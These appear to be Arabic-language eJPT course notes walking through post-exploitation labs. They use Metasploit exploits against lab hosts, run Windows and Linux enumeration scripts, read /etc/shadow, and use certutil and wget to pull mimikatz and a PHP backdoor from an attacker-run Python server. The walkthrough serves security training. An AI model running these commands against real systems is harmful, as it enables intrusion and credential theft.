# Session 9 (ejpt) - Day 9  
##  Host & Network Penetration Testing: Post-Exploitation  


السلام عليكم ورحمة الله وبركاته اليوم طبعا هو اخر يوم لكورس PTS غطينا تقريبا 90-95% من الكورس  

طبعا باذن الله راح نبدا من الي وقفنا عليه امس  

---

اللاب الاول الي معنا اليوم هو

Automating Windows Local Enumeration
-------------------------------------|  


طبعا زي مانشوف الان معطينا التارقت راح نفحصه بالـ nmap  
```bash
nmap -sV -sC 10.2.21.181  
```  

طبعا نشوف انه بورت 5985 مفتوح وهذا البورت عليه winrm service  

طبعا راح نستغله فورا   
```bash
msfconsole  
use exploit/windows/winrm/winrm_script_exec  
set RHOSTS 10.2.21.181  
set USERNAME administrator  
set PASSWORD tinkerbell  
set FORCE_VBS true  
exploit  
```  

طبعا المفروض نسوي بروت فورس عشان اليوزر والباسورد لكن اختصارنا واستغليناه فورا  

زي مانشوف عطانا meterpreter session  

نخلي السيشن في الخلفيه  
```bash
background  
```  

طبعا راح نسوي enum على النظام كامل الان قد استخدمنا قبل نفسها لكن هذي تختلف الموديول وفيه شي بالنهاية مفيد  

نشوف اول موديول  
```bash
use post/windows/gather/win_privs  
set SESSION 1  
run  
```  

نشوف انه عطانا الصلاحيات الي عندنا  

نشوف ثاني موديول  
```bash
use post/windows/gather/enum_logged_on_users  
set SESSION 1  
run  
```  

نشوف انه عطانا اليوزرات المسجله قبل واليوزر الي مسجل حاليا  

وباقي الموديول استخدمناها سابقا  


طبعا الشي الجديد انه فيه script او اداة تختصر عليك بدال ماتجي تسوي موديول موديول هذا راح يسوي كلشي مره وحده  

you can access the script through the following GitHub repository: https://github.com/411Hall/JAWS  


طبعا هذي الاداة راح تسوي لنا كلشي حرفيا مايحتاج نسوي واحد واحد  

طبعا نحمل السكربت ونسوي له run  
```bash
cd C:\\
mkdir Temp  
cd Temp  
upload /root/Desktop/jaws-enum.ps1  
shell  
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt  
download JAWS-Enum.txt  
```  

ونشوف انه عطانا ملف فيه كل المخرجات طبعا باسم JAWS-Enum.txt زي ماحددنا بالامر  
طبعا لابد ترفع السكربت على مشين التارقت ويفضل تكون في مسار Temp  
بعدها تفتح الشيل وتشغل الاداة  
بعدها تحمل الملف الي فيه المخرجات وتقراه وتحصل فيه اغلب الاشياء الي حصلها مثل اليوزرات والقروبز وبتحصل اشياء ثانيه  


طبعا فيه غيرها وافضل مثل (winpeas)[https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe]  


ونفس الكلام موجود سكربت اخر او اداة خاصة بنظام لينكس اسمها (linpeas)[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS]  

الى هنا انتهى اللاب نشوف الي بعده  

---  

اللاب الثاني الي معنا اليوم هو

Linux: Enumerating System Information
--------------------------------------|  

طبعا الان ناخذ التارقت يانفحص كامل الشبكة او ناخذ الايبي حقنا ونغير اخر ديجت نزيد عليه 1  

طبعا اختصار للوقت راح نفحص بالـ nmap ونشوف انه ftp open ومصاب كذالك بنستغل فورا  
```bash
msfconsole  
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 192.178.80.3  
run  
```  

ونشوف انه عطانا شيل الان  

طبعا الشيل الي معنا الان non-interactive راح نخليه interactive عن طريق ال Bash shell  
```bash
/bin/bash -i [to open interactive shell on Linux target]  
```  

طبعا الان راح نحاول نرفع السيشن الى meterpreter session  
```bash
sessions -u 1 [to upgrade from shell session to meterpreter session]  
```  

طبعا الان ندخل على السيشن وننفذ بعض الاوامر الي راح تفيدنا كمعلومات  
```bash
session -i 2  
```  

الان راح ننفذ بعض الاوامر  
```bash
sysinfo [يعطيك معلومات عن التارقت]  
```  

خلونا نفتح الشيل  
```bash
shell [to open bash shell]  
```  

وو ننفذ بعض الاوامر  
```bash
hostname  
cat /etc/issue  [ Linux distro name and release version ]  
cat /etc/*release  [ Linux distro name and release version ]  
uname -a [ to identify is the version of the Linux kernel running on the target. ]  
lscpu [ identify hardware information regarding the CPU being used on the target system ]  
df -h [list of storage devices attached to the Linux system and information regarding their respective mount points and storage capacity ]  
```  

الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب الثالث الي معنا اليوم هو

Linux: Enumerating Users & Groups
----------------------------------|  

طبعا نفس اللاب السابق ونفس الاستغلال  
```bash
msfconsole  
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 192.72.78.3  
run  
```  

ونشوف انه عطانا شيل الان  

طبعا الشيل الي معنا الان non-interactive راح نخليه interactive عن طريق ال Bash shell  
```bash
/bin/bash -i [to open interactive shell on Linux target]  
```  

طبعا الان راح نشوف بعض اوامر الشيل  
```bash
id [to know your id if you have 0 you have full privilege]  
cat /etc/passwd [to identify all users on target system]  
cat /etc/shadow [to idebtify hashs of each user have password]  
groups [to identify groups]  
lastlog [to identify the all users are logged in and the user has already logon]  
```  

الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب الرابع الي معنا اليوم هو  

Linux: Enumerating Network Information  
--------------------------------------|  

طبعا نفس اللاب السابق ونفس الاستغلال  
```bash
msfconsole  
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 192.72.78.3  
run  
```  

ونشوف انه عطانا شيل الان  

طبعا الشيل الي معنا الان non-interactive راح نخليه interactive عن طريق ال Bash shell  
```bash
/bin/bash -i [to open interactive shell on Linux target]  
```  

طبعا الان راح نحاول نرفع السيشن الى meterpreter session  
```bash
sessions -u 1 [to upgrade from shell session to meterpreter session]  
```  

طبعا الان ندخل على السيشن وننفذ بعض الاوامر الي راح تفيدنا كمعلومات  
```bash
session -i 2  
```  

الان راح ننفذ بعض الاوامر  
```bash
ifconfig [ list of network interfaces connected to the target system and their respective IP addresses]  
netstat [get a list of open ports on the target system]  
route [to obtain is the routing table]  
```  

ونقدر من الشيل ننفذ الاوامر هذي وراح تعطينا نفس مخرجات اوامر الـ meterpreter الي نفذناها بالاعلى  
```bash
shell
ip a s [this command will display the list of network interfaces connected to the target system.]  
cat /etc/networks [the list of configured networks and their subnets]  
cat /etc/hosts [he list of locally mapped domains and their respective IP addresses]  
cat /etc/resolv.conf [ to identify the default DNS name server address]  
```  

الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب الخامس الي معنا اليوم هو  

Linux: Enumerating Processes & Cron Jobs   
-----------------------------------------|  

طبعا نفس اللاب السابق ونفس الاستغلال  
```bash
msfconsole  
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 192.72.78.3  
run  
```  

ونشوف انه عطانا شيل الان  

طبعا الشيل الي معنا الان non-interactive راح نخليه interactive عن طريق ال Bash shell  
```bash
/bin/bash -i [to open interactive shell on Linux target]  
```  

طبعا الان راح نحاول نرفع السيشن الى meterpreter session  
```bash
sessions -u 1 [to upgrade from shell session to meterpreter session]  
```  

طبعا الان ندخل على السيشن وننفذ بعض الاوامر الي راح تفيدنا كمعلومات  
```bash
session -i 2  
```  

الان راح ننفذ بعض الاوامر  
```bash
ps [list of running processes on the target system]  
pgrep vsftpd [To find the PID of a specific service]  
```  

خلونا نفتح نشيل الان ونشوف كيف نشوف الكرون جوب  
```bash
ls -la /etc/cron*  [list of cron jobs on the Kali Linux system]  
```  

الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب السادس الي معنا اليوم هو  

Automating Linux Local Enumeration   
-----------------------------------|  

طبعا في هذا اللاب راح نسوي automate لكل الي سويناه قبل خلونا نشوف مع بعض  

طبعا الاستغلال مختلف  

خلونا الان نفحص التارقت سواء عن طريق كل الشبكه ونطلع ايبي التارقت او نزيد على الايبي تبعنا ديجت واحد  
```bash
nmap -sV 192.182.85.3  
```  

نشوف ان بورت 80 مفتوح طبعا وشغال عليه خدمة Apache 2.4.6 ونبحث ونعرف انه مصاب بنستغله فورا  
```bash
msfconsole  
use exploit/multi/http/apache_mod_cgi_bash_env_exec  
set RHOSTS 192.182.85.3  
set TARGETURI /gettime.cgi [specify the cgi file PATH]  
exploit  
```  

نشوف انه الان فتح لنا meterpreter session  
خلونا نخلي السيشن في الخلفيه  
```bash
background  
```  

الان راح نستخدم بعض الموديول الي يفيدنا  
```bash
use post/linux/gather/enum_configs  
set SESSION 1  
run  
```  

طبعا نشوف انه عطانا معلومات فيه بعضها يخزنها لاكن لابد تكون فاتح الداتابيس   

طبعا الموديولز متكرر لكن الاخير هو المفيد وهي انه راح نستخدم سكربت يخلي لنا كل هذا تلقائي ويسويه لنا بضغطة زر  

GitHub repository: https://github.com/rebootuser/LinEnum  

طبعا هذا هو السكربت لابد ننقله على مشين التارقت ونشغله من مشين التارقت  
نفتح طبعا الـ meterpreter session ونشغل السكربت  
```bash
session -i 1  
cd /tmp  
upload /root/Desktop/LinEnum.sh  
shell  
/bin/bash -i  
chmod +x LinEnum.sh  
./LinEnum.sh  
```  

ونشوف كمية البيانات الي تفيدك جدا وتختصر عليك وقت كثييير  


الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب السادس الي معنا اليوم هو  

Setting Up A Web Server With Python    
-----------------------------------|  

طبعا هذا اللاب راح نتركه فقط نقرا الحل وظيفته نعرف كيف نفتح سيرفر بايثون وعندنا 3 اصدارات من البايثون  

طبعا اصدار 1 و 2 نفس الطريقه  
```bash
python -m SimpleHTTPServer 80  
``` 

اصدار بايثون3  
```bash
python -m http.server 80  
```  

طبعا راح يكون يفتح السيرفر على نفس المسار الي تكتب فيه هذا الكوماند وبتقدر تاكسسه من الايبي تبعك متبوع برقم البورت  


الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب السابع الي معنا اليوم هو  

Transferring Files To Windows Targets    
-------------------------------------|  

طبعا هذا اللاب نفس الي قبل فتح بايثون سيرفر واستغلينا التارقت وبعدها نفذنا هذا الامر عشان ينقل ملف لنا من مشين الاتاكر الى مشين التارقت عن طريق البايثون سيرفر  

الاستغلال  
```bash
msfconsole  
use exploit/windows/http/rejetto_hfs_exec  
set RHOSTS 10.2.30.185  
exploit  
```  

سيرفر البايثون نفتحه بداخل مسار معين من جهازنا ف نفتح تاب ثاني
```bash
cd /usr/share/windows-resources/mimikatz/x64  
python3 -m http.server 80  
```  

الان نتصل بالسيشن الي فتحت لنا بالاكسبلويت ونروح لمسار معين عشان ننقل الملف  
```bash
cd C:\\  
mkdir Temp  
cd Temp  
shell  
```


والان ننقل الملف بهذا الامر  
```bash
certutil -urlcache -f http://10.10.5.2/mimikatz mimikatz.exe  
```  

طبعا الامر هذا للويندوز فيه اداة للينكس وهي wget  

الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب الثامن الي معنا اليوم هو  

Transferring Files To Linux Targets     
------------------------------------|  

نفس الطريقة السابقه لكن امر نقل الملف يكون  
```bash
wget http://192.196.45.2/php-backdoor.php  
```  

الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب التاسع الي معنا اليوم هو  

Upgrading Non-Interactive Shells     
---------------------------------|  

طبعا فكرة هذا اللاب يشرح لنا طريقة ترقية الـ non-interactive Shells  

طبعا نطلع ايبي التارقت ونستغل فورا  

الاستغلال  
```bash
msfconsole  
use exploit/linux/samba/is_known_pipename  
set RHOSTS 192.185.44.3  
exploit  
```  

هنا نشوف انه عطانا non-interactive shell  
طبعا نقدر نخليه interactive باكثر من طريقة وراح نشوف بعض الطرق  

الطريقة الاولى  
```bash
/bin/bash -i  
```  

ونشوف انه عطانا interactive shell  

الطريقة الثانيه  
```bash
python -c 'import pty; pty.spawn("/bin/bash")'  
```  

ونشوف انه عطانا interactive shell  

الى هنا انتهى اللاب نشوف الي بعده  

---

هذي اللابات فقط للقرائة بنقراها ف ماراح يكون فيه شرح

This labs only read because we don't have time     
-----------------------------------------------|  

1. Windows: PrivescCheck  
2. Permissions Matter!  
3. Editing Gone Wrong  
4. Maintaining Access: Persistence Service  
5. Maintaining Access: RDP   
6. Maintaining Access I   
7. T1168: Local Job Scheduling  
8. Windows: NTLM Hash Cracking   
9. Password Cracker: Linux  
10. Clearing Your Tracks On Windows   
11. Clearing Your Tracks On Linux  
12. All labs on Section web  

الى هنا ختمنا كورس PTS الحمدالله  

باذن الله يوم الاحد راح نبدا بكورس PTP  

اعذرونا على القصور لكن لابات ine متكرره ونفس الفكره ف كان شوي مو محمس مره  

باذن الله راح نستمتع كلنا في كورس الـ PTP وبنشوف اشياء اسطوريه  


الى هنا انتهينا في امان الله  

---

## Follow us on:  
Twitter:  
[s4cript](https://twitter.com/s4cript)  
[cyberhub](https://twitter.com/cyberhub)  
[0xNawaF1](https://twitter.com/0xNawaF1)  